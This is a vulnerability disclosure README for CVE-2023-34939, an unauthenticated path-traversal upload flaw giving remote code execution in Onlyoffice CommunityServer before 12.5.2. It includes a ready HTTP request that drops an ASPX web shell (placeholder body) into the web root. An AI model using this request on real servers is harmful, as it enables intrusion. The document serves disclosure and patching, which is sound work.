# CVE-2023-34939
RCE via Path Traversal vulnerability in **Onlyoffice CommunityServer < 12.5.2**

# Description
Onlyoffice Community Server is a collaborative platform for managing documents, projects and customer relations. Recently, a security vulnerability was discovered in this software version that could allow remote code execution (RCE) attacks.

The vulnerability is located in the UploadProgress.ashx component, which is responsible for handling file uploads. **Unauthorized** attackers can exploit this weakness by sending specially crafted requests to the server, triggering the execution of arbitrary code on the affected system.

This RCE vulnerability poses a serious risk to the security and integrity of organizations using Onlyoffice Community Server. As a result, it is highly recommended to update to the latest version of the software (v12.5.2 as for now) as soon as possible to prevent potential attacks.

**The only condition** is that there should be a thread created in the forum module.

# Proof of Concept
This PoC is for educational and research purposes only. It should not be used for malicious purposes or to cause harm to any system or network. The purpose of this PoC is to raise awareness of the vulnerability and to encourage responsible disclosure and patching.

```
POST /UploadProgress.ashx?submit=ASC.Web.UserControls.Forum.ForumAttachmentUploadHanler,ASC.Web.Community&SettingsID=11111111-1111-1111-1111-111111111111&ThreadID=3&UserID=11111111-1111-1111-1111-111111111110 HTTP/1.1
Host: REDACTED
Content-Length: 121
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary123

------WebKitFormBoundary123
Content-Disposition: form-data; name="files[]"; filename="../../../../../../../../../../../../../WebStudio/2023-34939.aspx"
Content-Type: application/asp

ASPX SHELL
------WebKitFormBoundary123--
```
Simply change the ThreadID and the file will be uploaded to the root web directory.

# Author
Kirill Firsov
[Twitter @k_firsov](https://twitter.com/k_firsov)

# References
Fixed in ["Onlyoffice CommunityServer v12.5.2"]("https://github.com/ONLYOFFICE/CommunityServer/blob/master/CHANGELOG.md#version-1252")
